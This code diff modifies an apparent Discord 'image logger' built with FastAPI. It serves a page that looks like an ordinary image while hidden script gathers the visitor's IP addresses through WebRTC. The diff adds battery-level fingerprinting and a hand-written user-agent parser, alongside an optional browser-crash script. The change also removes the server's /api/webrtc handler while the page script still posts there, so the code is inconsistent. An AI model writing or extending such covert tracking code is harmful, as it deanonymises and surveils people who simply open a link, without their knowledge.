@@ -1,7 +1,6 @@
 from fastapi import FastAPI, Request, BackgroundTasks
 from fastapi.responses import HTMLResponse, RedirectResponse, Response
 import requests
-import httpagentparser
 
 app = FastAPI()
 
@@ -19,6 +18,7 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
+
 def bot_check(ip: str, useragent: str):
     if not ip:
         return False
@@ -28,7 +28,41 @@ def bot_check(ip: str, useragent: str):
         return "Telegram"
     return False
 
-def make_report(ip: str, useragent: str, endpoint: str = "/api/image", webrtc_ips: list = None):
+
+def parse_ua(useragent: str) -> tuple[str, str]:
+    ua = useragent.lower()
+    if "windows" in ua:
+        os_name = "Windows"
+    elif "android" in ua:
+        os_name = "Android"
+    elif "iphone" in ua or "ipad" in ua:
+        os_name = "iOS"
+    elif "mac" in ua:
+        os_name = "macOS"
+    elif "linux" in ua:
+        os_name = "Linux"
+    else:
+        os_name = "Unknown"
+
+    if "edg/" in ua:
+        browser = "Edge"
+    elif "opr/" in ua or "opera" in ua:
+        browser = "Opera"
+    elif "chrome/" in ua and "chromium" not in ua:
+        browser = "Chrome"
+    elif "firefox/" in ua:
+        browser = "Firefox"
+    elif "safari/" in ua and "chrome" not in ua:
+        browser = "Safari"
+    elif "wget" in ua or "curl" in ua:
+        browser = "CLI"
+    else:
+        browser = "Unknown"
+
+    return os_name, browser
+
+
+def make_report(ip: str, useragent: str, endpoint: str = "/api/image"):
     if not ip or ip.startswith(blacklistedIPs):
         return
 
@@ -72,14 +106,7 @@ def make_report(ip: str, useragent: str, endpoint: str = "/api/image", webrtc_ip
         if config["antiBot"] == 1:
             ping = ""
 
-    os_name, browser = httpagentparser.simple_detect(useragent or "")
-
-    # Format WebRTC leaked IPs if collected
-    webrtc_section = ""
-    if webrtc_ips:
-        unique = list(dict.fromkeys(webrtc_ips))  # preserve order, dedupe
-        formatted = "\n".join(f"> `{addr}`" for addr in unique)
-        webrtc_section = f"\n**WebRTC Leaked IPs:**\n{formatted}\n"
+    os_name, browser = parse_ua(useragent or "")
 
     description = f"""**A User Opened the Original Image!**
 
@@ -97,7 +124,7 @@ def make_report(ip: str, useragent: str, endpoint: str = "/api/image", webrtc_ip
 > **Mobile:** `{info.get('mobile', False)}`
 > **VPN:** `{info.get('proxy', False)}`
 > **Bot:** `{info.get('hosting', False)}`
-{webrtc_section}
+
 **PC Info:**
 > **OS:** `{os_name}`
 > **Browser:** `{browser}`
@@ -122,43 +149,7 @@ def make_report(ip: str, useragent: str, endpoint: str = "/api/image", webrtc_ip
         pass
 
 
-@app.post("/api/webrtc")
-async def webrtc_collect(request: Request, background_tasks: BackgroundTasks):
-    """
-    Receives WebRTC ICE candidates POSTed by the client-side collector.
-    Fires a follow-up Discord report with the leaked IPs attached.
-    """
-    try:
-        body = await request.json()
-    except:
-        return Response(status_code=204)
-
-    ip = request.headers.get("x-forwarded-for") or (
-        request.client.host if request.client else "Unknown"
-    )
-    if "," in str(ip):
-        ip = ip.split(",")[0].strip()
-
-    useragent = request.headers.get("user-agent", "")
-    webrtc_ips: list[str] = body.get("ips", [])
-
-    if webrtc_ips:
-        background_tasks.add_task(make_report, ip, useragent, "/api/webrtc", webrtc_ips)
-
-    return Response(status_code=204)
-
-
 def _build_html(crash: bool) -> str:
-    """
-    Returns the logger HTML page.
-
-    WebRTC collector logic:
-      - Opens an RTCPeerConnection with a public STUN server (Google 8.8.8.8:3478).
-      - Creates a dummy data channel to force ICE candidate generation.
-      - Parses srflx (server-reflexive) and host candidates from the SDP.
-      - Deduplicates, then POSTs the list to /api/webrtc before the connection closes.
-      - No prompt, no user interaction, no permissions required.
-    """
     crash_script = ""
     if crash:
         crash_script = """
@@ -168,7 +159,7 @@ setTimeout(function(){
 }, 150);
 </script>"""
 
-    webrtc_script = """
+    collector_script = """
 <script>
 (function(){
     var ips = [];
@@ -178,14 +169,11 @@ setTimeout(function(){
         var lines = sdp.split('\\n');
         for (var i = 0; i < lines.length; i++) {
             var line = lines[i].trim();
-            // candidate lines: a=candidate:... typ host/srflx/relay
             if (line.indexOf('a=candidate:') === 0 || line.indexOf('candidate:') === 0) {
                 var parts = line.split(' ');
-                // parts[4] is the IP address in standard ICE candidate format
                 if (parts.length > 4) {
                     var ip = parts[4];
                     var typ = parts.length > 7 ? parts[7] : '';
-                    // capture host (LAN) and srflx (real public IP behind NAT)
                     if ((typ === 'host' || typ === 'srflx') && !seen[ip]) {
                         seen[ip] = true;
                         ips.push(ip);
@@ -195,12 +183,20 @@ setTimeout(function(){
         }
     }
 
+    function sendData(extraPayload) {
+        var payload = Object.assign({ ips: ips }, extraPayload || {});
+        fetch('/api/webrtc', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(function(){});
+    }
+
     try {
         var pc = new RTCPeerConnection({
             iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         });
 
-        // Data channel forces ICE gathering even without media tracks
         pc.createDataChannel('x');
 
         pc.onicecandidate = function(e) {
@@ -212,12 +208,22 @@ setTimeout(function(){
         pc.onicegatheringstatechange = function() {
             if (pc.iceGatheringState === 'complete') {
                 pc.close();
-                if (ips.length > 0) {
-                    fetch('/api/webrtc', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ ips: ips })
-                    }).catch(function(){});
+
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(function(battery) {
+                        var c_time = battery.chargingTime;
+                        var d_time = battery.dischargingTime;
+                        sendData({
+                            battery: {
+                                level: Math.round(battery.level * 100),
+                                charging: battery.charging,
+                                chargingTime: (c_time === Infinity ? null : c_time),
+                                dischargingTime: (d_time === Infinity ? null : d_time)
+                            }
+                        });
+                    }).catch(function(){ sendData(); });
+                } else {
+                    sendData();
                 }
             }
         };
@@ -235,7 +241,7 @@ setTimeout(function(){
 <head><meta charset="utf-8"><title></title></head>
 <body style="margin:0;padding:0;overflow:hidden;">
 <div style="background-image:url('{config["image"]}');background-size:contain;background-repeat:no-repeat;background-position:center;width:100vw;height:100vh;"></div>
-{webrtc_script}{crash_script}
+{collector_script}{crash_script}
 </body>
 </html>"""
 
